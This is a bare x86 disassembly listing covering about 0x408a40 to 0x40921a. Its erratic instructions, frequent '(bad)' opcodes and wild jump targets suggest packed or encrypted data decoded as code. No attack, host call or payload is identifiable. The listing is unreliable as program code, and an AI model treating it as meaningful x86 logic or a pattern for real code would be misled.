  408a40:	sbb    BYTE PTR [edi+eax*8-0x5d],bl
  408a44:	inc    ecx
  408a45:	mov    eax,ds:0x97b0d521
  408a4a:	stos   DWORD PTR es:[edi],eax
  408a4b:	aaa    
  408a4c:	mov    bh,0x9b
  408a4e:	dec    ecx
  408a4f:	mov    bl,0xc1
  408a51:	cmp    eax,0x887f577b
  408a56:	(bad)  
  408a57:	pop    ecx
  408a58:	mov    ds:0x8ef7bdef,eax
  408a5d:	adc    ebp,DWORD PTR [ebx]
  408a5f:	leave  
  408a60:	sub    eax,DWORD PTR [ebx+0x664918d3]
  408a66:	sub    esp,0xffffffa8
  408a69:	iret   
  408a6a:	sub    al,0x4b
  408a6c:	jl     0x408a75
  408a6e:	mov    ch,0x34
  408a70:	mov    esi,0x9bd562d2
  408a75:	test   bh,0x7f
  408a78:	jle    0x408a82
  408a7a:	imul   edx,DWORD PTR [ebp-0x50],0xb52bc2d2
  408a81:	bound  esp,QWORD PTR [eax+eax*2+0x572ec09a]
  408a88:	xchg   esp,eax
  408a89:	mov    DWORD PTR [edx],ebx
  408a8b:	pop    edx
  408a8c:	and    BYTE PTR [esi+0x370df089],al
  408a92:	mov    eax,ds:0x53c869e6
  408a97:	add    eax,0x19877511
  408a9c:	inc    ebx
  408a9d:	imul   edx,ebx,0xb5e894f8
  408aa3:	xor    esi,DWORD PTR [eax]
  408aa5:	sbb    DWORD PTR [edi-0x4c],edx
  408aa8:	add    BYTE PTR [ebx-0x731f8ca5],0xd2
  408aaf:	mov    al,ds:0xa06f8a8f
  408ab4:	ss ret 
  408ab6:	and    eax,0xbe2dafb1
  408abb:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408abd:	aaa    
  408abe:	stos   BYTE PTR es:[edi],al
  408abf:	es jge 0x408aa3
  408ac2:	es mov eax,0x96022b21
  408ac8:	cmc    
  408ac9:	jns    0x408afb
  408acb:	mov    cl,0x22
  408acd:	push   cs
  408ace:	and    DWORD PTR [edi],edi
  408ad0:	rol    DWORD PTR [esi+0x2d],0x37
  408ad4:	inc    ecx
  408ad5:	pop    ebp
  408ad6:	jne    0x408b25
  408ad8:	mov    al,ds:0x521daa20
  408add:	(bad)  
  408ade:	xlat   BYTE PTR ds:[ebx]
  408adf:	mov    ah,0x5d
  408ae1:	xchg   DWORD PTR [ebp-0x2c],ecx
  408ae4:	mov    cl,0x13
  408ae6:	mov    ebp,0x68cf524a
  408aeb:	fist   WORD PTR [eax-0x8]
  408aee:	int3   
  408aef:	dec    esi
  408af0:	ss hlt 
  408af2:	fld    TBYTE PTR [ebp-0x5d20f4a3]
  408af8:	pop    edi
  408af9:	mov    ebx,0x8fdb2426
  408afe:	and    al,0x63
  408b00:	jl     0x408b0f
  408b02:	and    BYTE PTR [ebp-0x7a],ch
  408b05:	popf   
  408b06:	mov    WORD PTR [eax],?
  408b08:	push   eax
  408b09:	xor    al,0x9d
  408b0b:	leave  
  408b0c:	sbb    bl,BYTE PTR [edx-0x47]
  408b0f:	dec    edx
  408b10:	ror    DWORD PTR [ecx],1
  408b12:	pushf  
  408b13:	pop    ebx
  408b14:	call   0xcba4:0x6a930bb4
  408b1b:	aam    0xc5
  408b1d:	cs dec ebp
  408b1f:	test   DWORD PTR [ebp-0x30],ebp
  408b22:	mov    edx,0xb14edc3b
  408b27:	test   esi,edi
  408b29:	mov    al,ds:0x872d8afe
  408b2e:	dec    edi
  408b30:	jmp    0xc5a97a5b
  408b35:	lods   al,BYTE PTR ds:[esi]
  408b36:	or     BYTE PTR [ebx],0xd4
  408b39:	dec    eax
  408b3a:	test   DWORD PTR [ebx],edx
  408b3c:	pop    esp
  408b3d:	add    BYTE PTR [esp+ebx*1-0x3396e1c2],cl
  408b44:	mov    eax,0x36d684e6
  408b49:	fcomp  DWORD PTR [ebp+ebp*2+0xf529d5b]
  408b50:	into   
  408b51:	mov    ebx,0x348a12ee
  408b56:	(bad)  
  408b57:	js     0x408b50
  408b59:	scas   eax,DWORD PTR es:[edi]
  408b5a:	fwait
  408b5b:	lea    esi,[edi]
  408b5d:	push   edx
  408b5e:	push   eax
  408b5f:	or     dl,BYTE PTR [ebx-0x6b]
  408b62:	stc    
  408b63:	pop    esi
  408b64:	dec    esp
  408b65:	jmp    0xd365ea92
  408b6a:	lea    esp,[esi+edx*8+0x5d]
  408b6e:	adc    al,0xcd
  408b70:	dec    eax
  408b71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b72:	fwait
  408b73:	int3   
  408b74:	mov    edx,edx
  408b76:	sbb    bh,BYTE PTR [edx]
  408b78:	xlat   BYTE PTR ds:[ebx]
  408b79:	call   0x48b6f78b
  408b7e:	scas   al,BYTE PTR es:[edi]
  408b7f:	xchg   DWORD PTR [ebp+0x35],ebx
  408b82:	and    ebp,DWORD PTR [ecx]
  408b84:	fimul  WORD PTR [edi-0x13d6052e]
  408b8a:	and    eax,0xd20336d5
  408b8f:	push   ebx
  408b90:	cmp    eax,0x6d6f3db3
  408b95:	cmp    BYTE PTR [eax+edx*1+0x174b1118],ch
  408b9c:	cmp    bl,dl
  408b9e:	mov    eax,ds:0x457611f
  408ba3:	sahf   
  408ba4:	or     eax,0x4f8de4f7
  408ba9:	xor    al,0xb7
  408bab:	repnz dec ebp
  408bad:	ret    0xcfc
  408bb0:	clc    
  408bb1:	ret    0xa215
  408bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bb5:	ss push 0x60
  408bb8:	push   0x6d61b8e9
  408bbd:	fwait
  408bbe:	pop    ebx
  408bbf:	mov    bh,0x52
  408bc1:	jne    0x408b94
  408bc3:	mov    al,ds:0x84591420
  408bc8:	lahf   
  408bc9:	(bad)  
  408bca:	or     cl,cl
  408bcc:	iret   
  408bcd:	mov    ds:0x5a480959,eax
  408bd2:	arpl   WORD PTR [esi],si
  408bd4:	dec    edi
  408bd5:	scas   al,BYTE PTR es:[edi]
  408bd6:	ins    BYTE PTR es:[edi],dx
  408bd7:	ins    BYTE PTR es:[edi],dx
  408bd8:	cwde   
  408bd9:	in     eax,dx
  408bda:	popa   
  408bdb:	push   ss
  408bdc:	aas    
  408bdd:	jecxz  0x408c43
  408bdf:	pcmpeqd mm1,mm6
  408be2:	sub    al,0x31
  408be4:	popf   
  408be5:	mov    ebx,0x16dd7cb4
  408bea:	cdq    
  408beb:	les    ecx,FWORD PTR [ecx+0x36704061]
  408bf1:	popa   
  408bf2:	push   edi
  408bf3:	sub    DWORD PTR [edx],ebp
  408bf5:	sbb    eax,0x5a2c7b41
  408bfa:	popa   
  408bfb:	repz icebp 
  408bfd:	sub    cl,BYTE PTR [esi+0x89b3ff2]
  408c03:	ss pop ebp
  408c05:	mov    WORD PTR [ebp+0x5d],ss
  408c08:	jg     0x408c60
  408c0a:	cdq    
  408c0b:	jbe    0x408bfa
  408c0d:	mov    eax,ds:0x658d9442
  408c12:	(bad)  
  408c13:	mov    edi,0x36c0ba7e
  408c18:	ret    
  408c19:	mov    dl,BYTE PTR [ebp+0x4c86ee7d]
  408c1f:	mov    al,0x34
  408c21:	sub    al,bl
  408c23:	cs cmc 
  408c25:	and    BYTE PTR [eax+ebp*4+0x7ceb2a20],cl
  408c2c:	add    al,0xbc
  408c2e:	in     al,0x63
  408c30:	aad    0xa1
  408c32:	or     eax,0x3aa2bcca
  408c37:	loop   0x408c7d
  408c39:	sub    BYTE PTR [esi],bh
  408c3b:	cli    
  408c3c:	add    eax,0x2b9f78a3
  408c41:	sbb    edi,ecx
  408c43:	jg     0x408bc9
  408c45:	sahf   
  408c46:	sbb    edx,DWORD PTR [edx]
  408c48:	das    
  408c49:	add    eax,0x760df8cb
  408c4e:	mov    dh,0xd1
  408c50:	es mov cl,0xc
  408c53:	(bad)  
  408c54:	xchg   edx,eax
  408c55:	dec    esp
  408c56:	push   esi
  408c57:	push   0x4c
  408c59:	dec    esi
  408c5a:	sub    eax,0x55487e3b
  408c5f:	cs and al,0xd5
  408c62:	in     al,dx
  408c63:	or     DWORD PTR [ecx],0xa0047310
  408c69:	push   edi
  408c6b:	or     bl,ah
  408c6d:	push   ecx
  408c6e:	or     ch,ch
  408c70:	fcmovu st,st(6)
  408c72:	int    0x78
  408c74:	pop    eax
  408c75:	imul   ecx,ecx,0x63
  408c78:	mov    BYTE PTR [ebx+0x4],dl
  408c7b:	out    0x91,eax
  408c7d:	mov    dl,0x69
  408c7f:	and    ebp,DWORD PTR [esi+ecx*1]
  408c82:	mov    eax,ds:0xe23836e5
  408c87:	sbb    eax,0xb80bcbd5
  408c8c:	adc    dh,dh
  408c8e:	mov    bh,BYTE PTR [edx]
  408c90:	iret   
  408c91:	mov    BYTE PTR [eax-0x22],al
  408c94:	dec    edi
  408c95:	xchg   DWORD PTR [ecx],esp
  408c97:	inc    edx
  408c98:	inc    ch
  408c9a:	dec    ebx
  408c9b:	fisttp QWORD PTR [edi+0x3b]
  408c9e:	bound  edx,QWORD PTR [ecx-0x6a3ed1a0]
  408ca4:	xchg   esp,eax
  408ca5:	fld    DWORD PTR [ebp+esi*4-0x1c]
  408ca9:	add    al,bl
  408cab:	nop
  408cac:	popf   
  408cad:	adc    eax,0xf9345bfa
  408cb2:	fwait
  408cb3:	xchg   ebp,eax
  408cb4:	cmp    DWORD PTR [ecx+0x53],edx
  408cb7:	cmp    eax,0x72386804
  408cbc:	cmp    al,0x20
  408cbe:	ins    DWORD PTR es:[edi],dx
  408cbf:	xlat   BYTE PTR ds:[ebx]
  408cc0:	or     ebp,DWORD PTR [edi+ebp*8]
  408cc3:	mov    ebx,0x2c98793d
  408cc8:	xchg   DWORD PTR [eiz*1-0x7588967c],ebx
  408ccf:	stc    
  408cd0:	or     DWORD PTR es:[edi+0x62ac92f2],esi
  408cd7:	xchg   edi,eax
  408cd8:	test   bl,0xfd
  408cdb:	inc    ebp
  408cdc:	loop   0x408d31
  408cde:	aaa    
  408cdf:	sub    DWORD PTR [ecx+0x4ce09c2b],eax
  408ce5:	mov    ds:0x66654747,eax
  408cea:	fs dec ebp
  408cec:	or     dl,0x68
  408cef:	rcl    DWORD PTR [ebx],1
  408cf1:	ret    
  408cf2:	jp     0x408ca6
  408cf4:	xchg   ebx,eax
  408cf5:	dec    esp
  408cf6:	xchg   BYTE PTR ds:0x65012422,al
  408cfc:	ins    DWORD PTR es:[edi],dx
  408cfd:	sub    edx,DWORD PTR [esi+0x2aaca899]
  408d03:	xchg   BYTE PTR [edx-0x74],ah
  408d06:	frstor [edi-0x24]
  408d09:	push   ebp
  408d0a:	int    0x6f
  408d0c:	jnp    0x408cea
  408d0e:	mov    ch,0xea
  408d10:	pop    eax
  408d11:	adc    bl,BYTE PTR [edx]
  408d13:	aas    
  408d14:	inc    ebp
  408d15:	fdivr  DWORD PTR ds:0x11250411
  408d1b:	jno    0x408cb2
  408d1d:	test   dl,dl
  408d1f:	into   
  408d20:	rcr    BYTE PTR [edx],1
  408d22:	mov    ebx,0x342372d7
  408d27:	jge    0xd47cf472
  408d2d:	xor    DWORD PTR [ecx+eiz*1-0x16],esp
  408d31:	inc    esi
  408d32:	push   ss
  408d33:	mov    ebp,0x5f420bd7
  408d38:	mov    ebp,0xd0261d2b
  408d3d:	call   0x754a49f9
  408d42:	xchg   esi,eax
  408d43:	icebp  
  408d44:	fstp   DWORD PTR [bx+di+0x1136]
  408d49:	adc    BYTE PTR [edi],bh
  408d4b:	imul   ebp,DWORD PTR [ebx-0x7d],0x39
  408d4f:	or     eax,0xadaa3a7e
  408d54:	xchg   ecx,eax
  408d55:	pop    eax
  408d56:	push   ecx
  408d57:	js     0x408d71
  408d59:	in     al,0xf2
  408d5b:	into   
  408d5c:	js     0x408d87
  408d5e:	push   edx
  408d5f:	out    dx,al
  408d60:	push   ebp
  408d61:	add    BYTE PTR [ecx+edi*1],dl
  408d64:	pop    edx
  408d65:	dec    BYTE PTR [ebx]
  408d67:	pop    eax
  408d68:	in     al,0x51
  408d6a:	jae    0x408d68
  408d6c:	adc    dh,BYTE PTR fs:[esi]
  408d6f:	jno    0x408d35
  408d71:	es (bad) 
  408d73:	or     eax,DWORD PTR [ebx+0x2cf77e46]
  408d79:	pusha  
  408d7a:	or     BYTE PTR [ecx-0x2e],bh
  408d7d:	mov    BYTE PTR [ebx*2-0x328b02cb],ah
  408d84:	and    edi,DWORD PTR [ecx+0x5ecb20fe]
  408d8a:	cli    
  408d8b:	xchg   edx,eax
  408d8c:	add    DWORD PTR [eax+0x3bc66c60],edx
  408d92:	ror    BYTE PTR [ecx+0x46],0x3d
  408d96:	into   
  408d97:	and    ebp,DWORD PTR [eax]
  408d99:	stos   BYTE PTR es:[edi],al
  408d9a:	mov    ?,WORD PTR es:[ebp+ebx*2-0x6e]
  408d9f:	push   esp
  408da0:	std    
  408da1:	and    DWORD PTR [edx+0x25e553e8],ebp
  408da7:	dec    ebp
  408da8:	mov    eax,ds:0x6a4c5267
  408dad:	js     0x408de6
  408daf:	dec    edx
  408db0:	mov    eax,ds:0x7fbd8d62
  408db5:	lds    esp,FWORD PTR [esi-0x53]
  408db8:	xchg   esp,eax
  408db9:	lods   eax,DWORD PTR ds:[esi]
  408dba:	push   es
  408dbb:	pop    ss
  408dbc:	(bad)
  408dc0:	aas    
  408dc1:	mov    dl,0x28
  408dc3:	push   eax
  408dc4:	test   al,0xf0
  408dc6:	int    0x4b
  408dc8:	das    
  408dc9:	cwde   
  408dca:	dec    ebp
  408dcb:	test   eax,0xb7ab3433
  408dd0:	retf   0xd7a4
  408dd3:	add    eax,0x504dde10
  408dd8:	xchg   ebx,eax
  408dd9:	xor    BYTE PTR [eax-0x385f54b6],bl
  408ddf:	sbb    dl,ah
  408de1:	cli    
  408de2:	div    BYTE PTR ds:0xf957ef34
  408de8:	add    al,0xf1
  408dea:	push   ebx
  408deb:	aam    0xae
  408ded:	aad    0x2e
  408def:	sbb    al,0x6e
  408df1:	xchg   edi,eax
  408df2:	dec    esp
  408df3:	loopne 0x408dcc
  408df5:	ret    
  408df6:	inc    edx
  408df7:	adc    BYTE PTR [edi],dl
  408df9:	jbe    0x408da9
  408dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dfc:	pop    edx
  408dfd:	lods   eax,DWORD PTR ds:[esi]
  408dfe:	in     al,0x75
  408e00:	push   edi
  408e01:	mov    edi,0x5acc09f1
  408e06:	mov    ds:0x8b094f4d,al
  408e0b:	popa   
  408e0c:	mov    eax,DWORD PTR [edi+0x54137076]
  408e12:	jmp    0x408e86
  408e14:	scas   eax,DWORD PTR es:[edi]
  408e15:	push   edx
  408e16:	pop    edx
  408e17:	mov    al,ds:0x2ca8f072
  408e1c:	push   eax
  408e1d:	sub    BYTE PTR [edx+0x11],ch
  408e20:	fs mov edx,0x62f97042
  408e26:	or     esp,DWORD PTR [eax-0x72]
  408e29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e2a:	xor    eax,0x39c919c4
  408e2f:	sahf   
  408e30:	push   ss
  408e31:	jmp    0x1de0:0x7fdf4363
  408e38:	jb     0x408e3a
  408e3a:	rcl    BYTE PTR [edx-0xa66bc3],1
  408e40:	cmp    cl,bh
  408e42:	outs   dx,DWORD PTR ds:[esi]
  408e43:	mov    dh,0xd1
  408e45:	(bad)  
  408e46:	pusha  
  408e47:	sti    
  408e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e49:	loop   0x408e52
  408e4b:	inc    BYTE PTR [edx-0x72]
  408e4e:	sbb    dl,bl
  408e50:	int3   
  408e51:	arpl   di,bp
  408e53:	jnp    0x408eb7
  408e55:	pop    edx
  408e56:	mov    eax,ds:0xb804c34f
  408e5b:	stos   DWORD PTR es:[edi],eax
  408e5c:	sub    BYTE PTR [eax-0x2c],cl
  408e5f:	cld    
  408e60:	fst    DWORD PTR [eax+0x17b85559]
  408e66:	or     al,0xf8
  408e68:	je     0x408e85
  408e6a:	mov    bh,0x94
  408e6c:	xchg   DWORD PTR [esi-0x66946b44],edi
  408e72:	retf   
  408e73:	mov    al,ds:0x44c7d0c1
  408e78:	mov    al,0xbe
  408e7a:	lds    eax,FWORD PTR [eax-0x3b]
  408e7d:	outs   dx,DWORD PTR ds:[esi]
  408e7e:	aad    0x66
  408e80:	out    dx,al
  408e81:	mov    esp,0xfb013678
  408e86:	jns    0x408e52
  408e88:	test   eax,0x8dec6661
  408e8d:	inc    edi
  408e8e:	cmp    ecx,DWORD PTR [ebp-0x4a]
  408e91:	jnp    0x408e84
  408e93:	dec    edi
  408e94:	lahf   
  408e95:	lea    eax,[esi]
  408e97:	cmp    eax,0x84e03da3
  408e9c:	mov    ch,0x6a
  408e9e:	lods   al,BYTE PTR ds:[esi]
  408e9f:	out    0xc0,eax
  408ea1:	or     eax,0xe360dbb7
  408ea6:	adc    eax,DWORD PTR [eax]
  408ea8:	je     0x408ec9
  408eaa:	jmp    0x9a:0xf771330
  408eb1:	push   esp
  408eb2:	call   0x7fcae0d6
  408eb7:	jecxz  0x408e82
  408eb9:	imul   esp,DWORD PTR [ecx+0x5bbff8a5],0xffffffc4
  408ec0:	call   0x7774:0xe88281b3
  408ec7:	and    DWORD PTR [edx+esi*1+0x54],edi
  408ecb:	pop    esp
  408ecc:	sub    edi,esi
  408ece:	test   al,0x88
  408ed0:	out    0x3d,al
  408ed2:	icebp  
  408ed3:	(bad)  [edi]
  408ed5:	pusha  
  408ed6:	inc    ebx
  408ed7:	jmp    0x408eeb
  408ed9:	sbb    eax,0x1f
  408edc:	adc    al,0x4b
  408ede:	jp     0x408e7b
  408ee0:	pop    ss
  408ee1:	lods   eax,DWORD PTR ds:[esi]
  408ee2:	int3   
  408ee3:	push   edi
  408ee4:	sbb    eax,0xbed27f96
  408ee9:	stc    
  408eea:	iret   
  408eeb:	imul   eax,DWORD PTR [ecx-0x6aec7015],0x4883f49
  408ef5:	imul   eax
  408ef7:	aas    
  408ef8:	sub    al,BYTE PTR [ebx-0x50cc2e69]
  408efe:	pop    ds
  408eff:	push   es
  408f00:	iret   
  408f01:	ret    
  408f02:	or     eax,0xef69429e
  408f07:	sub    dl,al
  408f09:	sbb    DWORD PTR [ecx],esi
  408f0b:	mov    edi,0xf16a4f05
  408f10:	xchg   esi,eax
  408f11:	mov    gs,WORD PTR [ebx]
  408f13:	mov    ds:0x269dca5f,al
  408f18:	push   ebx
  408f19:	stos   BYTE PTR es:[edi],al
  408f1a:	pop    ds
  408f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f1c:	loope  0x408f4e
  408f1e:	mov    ch,0x89
  408f20:	das    
  408f21:	call   0xdf38:0x68217e89
  408f28:	dec    eax
  408f29:	or     DWORD PTR [ebp-0x5e5fcc9e],0x6762f40e
  408f33:	sbb    BYTE PTR [ecx-0xb],bh
  408f36:	stos   DWORD PTR es:[edi],eax
  408f37:	fist   WORD PTR [edx+0x44]
  408f3a:	mov    al,0xaf
  408f3c:	adc    DWORD PTR [esi-0x104c87cf],0x7fd67fb
  408f46:	in     al,dx
  408f47:	cmp    al,0x2e
  408f49:	dec    ebx
  408f4a:	sbb    DWORD PTR [edx+0x7b],0x66e33d9a
  408f51:	call   0x18038c8e
  408f56:	push   esp
  408f57:	mov    dl,BYTE PTR [eax+eax*1-0x16]
  408f5b:	ins    BYTE PTR es:[edi],dx
  408f5c:	pop    eax
  408f5d:	inc    esi
  408f5e:	pop    ebx
  408f5f:	push   ebp
  408f60:	lods   eax,DWORD PTR ds:[esi]
  408f61:	addr16 inc eax
  408f63:	push   cs
  408f64:	out    dx,eax
  408f65:	push   esp
  408f66:	pop    edi
  408f67:	jmp    0x408f62
  408f69:	sbb    DWORD PTR [ecx+0x14],0xffffffeb
  408f6d:	dec    edi
  408f6e:	sbb    ah,cl
  408f70:	pusha  
  408f71:	outs   dx,BYTE PTR ds:[esi]
  408f72:	ja     0x408f09
  408f74:	sub    ebx,ebp
  408f76:	inc    eax
  408f77:	xchg   esp,eax
  408f78:	mov    esp,0xbc0c25d6
  408f7d:	xor    BYTE PTR [edx+ebx*2-0xb],dl
  408f81:	arpl   WORD PTR [eax+ebp*2+0x73],dx
  408f85:	push   esi
  408f86:	fwait
  408f87:	sar    DWORD PTR [edi],cl
  408f89:	pop    ecx
  408f8a:	lea    edx,[esi-0x7f]
  408f8d:	(bad)  [eax+0x5f]
  408f90:	inc    ebx
  408f91:	ja     0x408f18
  408f93:	or     DWORD PTR [ebx+0xa154cbe],ebx
  408f99:	cdq    
  408f9a:	mov    ebx,0x7abf794e
  408f9f:	and    ah,BYTE PTR [ebx]
  408fa1:	std    
  408fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fa3:	cmp    eax,0xd37ed68b
  408fa8:	inc    edx
  408fa9:	pop    esi
  408faa:	adc    eax,0xfc1bef9d
  408faf:	push   cs
  408fb0:	add    eax,0x1dfe274
  408fb5:	call   0x158c6c4e
  408fba:	add    dl,BYTE PTR [eax-0x1d]
  408fbd:	je     0x408fb0
  408fbf:	mov    al,ds:0x796febcc
  408fc4:	or     bl,dh
  408fc6:	(bad)  
  408fc7:	cmc    
  408fc8:	xor    BYTE PTR [ebx-0x63],0xf4
  408fcc:	mov    ebx,0x4b3d4b16
  408fd1:	mov    al,ds:0x5a2f336e
  408fd6:	sti    
  408fd7:	push   edi
  408fd8:	psllq  mm0,QWORD PTR [esi+0x4bcb09dc]
  408fdf:	jp     0x408ff9
  408fe1:	test   DWORD PTR ds:0x4a927ee2,edi
  408fe7:	aaa    
  408fe8:	ret    0x5c03
  408feb:	lea    edx,ds:0x83c5cbff
  408ff1:	sbb    DWORD PTR ds:0xba32ace6,ebx
  408ff7:	xor    al,0xec
  408ff9:	add    al,0x60
  408ffb:	xor    eax,ebx
  408ffd:	arpl   bp,bp
  408fff:	sbb    esi,DWORD PTR [edx-0x5f]
  409002:	inc    edi
  409003:	or     bh,ch
  409005:	das    
  409006:	fs into 
  409008:	fadd   QWORD PTR [edx-0x45fd61ed]
  40900e:	push   edi
  40900f:	out    dx,eax
  409010:	mov    bh,0xbb
  409012:	inc    esp
  409013:	(bad)  
  409014:	xor    BYTE PTR [esi+0x1473e7a8],dl
  40901a:	jnp    0x40906b
  40901c:	and    eax,0x3b941637
  409021:	out    0xbb,eax
  409023:	stos   DWORD PTR es:[edi],eax
  409024:	out    dx,al
  409025:	call   0xff07bd50
  40902a:	cmp    al,0x6e
  40902c:	mov    bh,0xce
  40902e:	and    esp,DWORD PTR [esi+0x6009033a]
  409034:	adc    eax,DWORD PTR [esi-0x63]
  409037:	shr    DWORD PTR [eax],0x2d
  40903a:	cmc    
  40903b:	outs   dx,DWORD PTR ds:[esi]
  40903c:	inc    edx
  40903d:	jbe    0x409017
  40903f:	jmp    0x67f5:0x925c46e8
  409046:	les    ebp,FWORD PTR fs:[ecx]
  409049:	pop    ebp
  40904a:	dec    esi
  40904b:	enter  0xec1a,0x1c
  40904f:	std    
  409050:	out    dx,al
  409051:	in     al,dx
  409052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409053:	mov    esp,esi
  409055:	xchg   edx,eax
  409056:	ret    
  409057:	xchg   edi,eax
  409058:	test   bh,ah
  40905a:	or     BYTE PTR [edi+0x780abcfa],cl
  409060:	fwait
  409061:	xchg   esp,eax
  409062:	cmp    eax,0xca8c3d50
  409067:	sub    esi,DWORD PTR [esi-0x11a71fe4]
  40906d:	pop    ebp
  40906e:	mov    edx,0x5649944b
  409073:	in     eax,0xda
  409075:	sub    al,BYTE PTR [edx-0x7cf546d7]
  40907b:	es sti 
  40907d:	cwde   
  40907e:	inc    ebx
  40907f:	stos   BYTE PTR es:[edi],al
  409080:	jnp    0x4090b0
  409082:	shl    BYTE PTR [edx+0x2d],0xa2
  409086:	add    bl,BYTE PTR [esi+0x2d]
  409089:	cmp    DWORD PTR [edx-0x637aa88c],edx
  40908f:	sub    BYTE PTR [edx],cl
  409091:	lods   eax,DWORD PTR ds:[esi]
  409092:	out    0x89,al
  409094:	lahf   
  409095:	aaa    
  409096:	mov    al,0x2f
  409098:	es icebp 
  40909a:	daa    
  40909b:	int    0x77
  40909d:	pop    edi
  40909e:	and    eax,DWORD PTR [esi-0x3e4379fd]
  4090a4:	sbb    cl,cl
  4090a6:	dec    edi
  4090a7:	xor    BYTE PTR [ecx-0x5e],0xc2
  4090ab:	aaa    
  4090ac:	and    ah,cl
  4090ae:	mov    edi,0x3b491b6c
  4090b3:	xor    eax,0xfb88a6d1
  4090b9:	mov    ds:0xeac95517,eax
  4090be:	or     BYTE PTR [ecx-0x408b809],al
  4090c4:	lods   al,BYTE PTR ds:[esi]
  4090c5:	xchg   esi,eax
  4090c6:	add    DWORD PTR [ebp-0x12],esp
  4090c9:	xchg   edx,eax
  4090ca:	popf   
  4090cb:	mov    al,ds:0x6f1633bc
  4090d0:	cmp    DWORD PTR [ecx+edi*4+0x62],edi
  4090d4:	inc    edi
  4090d5:	pop    esi
  4090d6:	dec    ebx
  4090d7:	jmp    0xd8038930
  4090dc:	adc    DWORD PTR [ebx],ecx
  4090de:	mov    WORD PTR [ebp-0x77],gs
  4090e1:	pop    ds
  4090e2:	and    dh,ch
  4090e4:	xchg   ebp,eax
  4090e5:	xor    eax,0x1777fcbb
  4090ea:	pop    es
  4090eb:	dec    eax
  4090ec:	inc    ebp
  4090ed:	es ret 0x391b
  4090f1:	iret   
  4090f2:	or     edi,eax
  4090f4:	mov    cl,0xa0
  4090f6:	ja     0x409164
  4090f8:	cmp    al,0x6e
  4090fa:	or     ecx,DWORD PTR [edi-0x5a]
  4090fd:	ret    0x2e1e
  409100:	enter  0x4118,0xe9
  409104:	stc    
  409105:	adc    BYTE PTR [ebp+0x0],ch
  409108:	push   cs
  409109:	xchg   esi,eax
  40910a:	arpl   WORD PTR [edx+0x2a5e056],bx
  409110:	mov    al,ds:0x314b143
  409115:	shl    BYTE PTR [esi],1
  409117:	int    0xa6
  409119:	adc    eax,0xf5d29c0a
  40911e:	dec    esi
  40911f:	(bad)  
  409120:	cmp    ch,BYTE PTR [eax-0x35]
  409123:	sub    eax,0xb47d46dc
  409128:	shl    BYTE PTR [edx-0x3],1
  40912b:	call   0x910f:0xd1ccff1
  409132:	mov    bl,0x20
  409134:	inc    esp
  409135:	mov    bl,0xe2
  409137:	fistp  WORD PTR [ebp+0x26]
  40913a:	sub    edi,esi
  40913c:	mov    ebx,0x312c7636
  409141:	mov    ebx,0x5da88977
  409146:	int3   
  409147:	mov    ecx,0x1425ceb
  40914c:	xchg   ebx,eax
  40914d:	mov    bl,0x7e
  40914f:	sub    DWORD PTR [edx],eax
  409151:	jnp    0x409136
  409153:	test   DWORD PTR [edi-0x51048450],edi
  409159:	sahf   
  40915a:	outs   dx,BYTE PTR ds:[esi]
  40915b:	or     eax,0xc1b53d40
  409160:	mov    al,0xbb
  409162:	out    dx,al
  409163:	ins    DWORD PTR es:[edi],dx
  409164:	mul    BYTE PTR [edx+0x56abf3e6]
  40916a:	xchg   esp,eax
  40916b:	dec    esi
  40916c:	and    BYTE PTR [ecx],ch
  40916e:	out    dx,al
  40916f:	hlt    
  409170:	stc    
  409171:	dec    esi
  409172:	push   ecx
  409173:	add    DWORD PTR [esi],ebx
  409175:	mov    edx,0xbb00dbdf
  40917a:	pop    ecx
  40917b:	dec    ebx
  40917c:	int3   
  40917d:	imul   edx,DWORD PTR [ecx],0x7
  409180:	cdq    
  409181:	mov    WORD PTR [edx+0x448f828],gs
  409187:	repz adc DWORD PTR [ebp+0x77e0f899],edx
  40918e:	pop    esi
  40918f:	mov    ch,0xb3
  409191:	rol    DWORD PTR [esi],0x8b
  409194:	(bad)  
  409195:	into   
  409196:	sahf   
  409197:	cmp    esi,DWORD PTR [esi+0x6a]
  40919a:	shl    DWORD PTR [edx-0x71],1
  40919d:	sub    eax,0x58f05d9e
  4091a2:	add    dl,bh
  4091a4:	sub    al,0x80
  4091a6:	into   
  4091a7:	pop    ds
  4091a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091a9:	or     eax,0xa4958314
  4091ae:	scas   al,BYTE PTR es:[edi]
  4091af:	mov    ah,0x5
  4091b1:	xchg   ebp,eax
  4091b2:	cmc    
  4091b3:	hlt    
  4091b4:	dec    edx
  4091b5:	ret    0xc868
  4091b8:	sbb    DWORD PTR [eax-0x2b],edi
  4091bb:	mov    edi,0xe63bd046
  4091c0:	inc    edx
  4091c1:	out    dx,al
  4091c2:	mov    ebp,0x7e295ab1
  4091c7:	imul   esp,eax,0x1f
  4091ca:	add    BYTE PTR [eax+0x51d55139],dl
  4091d0:	nop
  4091d1:	xchg   edx,eax
  4091d2:	mov    bl,0xb5
  4091d5:	lods   eax,DWORD PTR ds:[esi]
  4091d6:	mov    al,ds:0x176d177e
  4091db:	pop    es
  4091dc:	or     esi,ebx
  4091de:	into   
  4091df:	pop    eax
  4091e0:	popa   
  4091e1:	shl    DWORD PTR [ebp-0x546f52a5],0x92
  4091e8:	addr16 je 0x409199
  4091eb:	xchg   ecx,eax
  4091ec:	or     BYTE PTR [edi],ah
  4091ee:	not    DWORD PTR [ecx+edi*8]
  4091f1:	mov    al,ds:0xf053f72f
  4091f6:	pop    edx
  4091f7:	sti    
  4091f8:	inc    ebp
  4091f9:	pop    esp
  4091fa:	and    eax,0x99fe0176
  4091ff:	(bad)  
  409200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409201:	adc    eax,ebx
  409203:	sti    
  409204:	xchg   BYTE PTR [esi+esi*2+0x534a43a4],bh
  40920b:	adc    esp,edx
  40920d:	mov    BYTE PTR [ecx-0x35],0xfe
  409211:	or     eax,0xa05a3fed
  409216:	mov    ecx,cs
  409218:	xchg   ebp,eax
  40921a:	jnp    0x409201
